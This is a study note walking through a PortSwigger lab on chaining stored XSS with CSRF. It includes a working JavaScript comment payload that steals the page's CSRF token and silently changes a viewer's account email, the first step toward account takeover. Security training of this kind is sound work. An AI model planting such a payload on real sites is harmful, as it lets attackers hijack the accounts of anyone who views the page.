- Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability, you can make it trigger this functionality to change the victim's email address to one that you control, and then trigger a password reset to gain access to the account.
  This type of exploit is typically referred to as cross-site request forgery(CSRF), which is slightly confusing because CSRF can also occur as a standalone vulnerability.
- When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.

## Steps to solve lab
### Title - Exploiting XSS to perform CSRF

**Desc** - This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.
You can log in to your own account using the following credentials: `wiener:peter`

**Our end goal** - To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.


1. Analyze the page and as per the lab description there is a vulnerability in the blog comments function.
![[XSS93.png]]

![[XSS94.png]]
As you can see above, our tag is not sanitized it means we can execute javascript.

2. Now, copy the below payload and paste it into the "comment" box.

**Payload** - 
```jsx
<script>
    window.addEventListener("DOMContentLoaded", function(){
        var token = document.getElementsByName('csrf')[0].value;

        var data = new FormData();
        data.append('csrf', token);
        data.append('email', 'changed32@gmail.com');

        fetch('/my-account/change-email',{
            method: 'POST',
            mode: 'no-cors',
            body: data
        });

    });
</script>
```
For the explaination to the above code, you can take a look at [[(lab-18)Exploiting_cross-site_scripting_to_capture_passwords]]

![[XSS105.png]]

![[XSS106.png]]
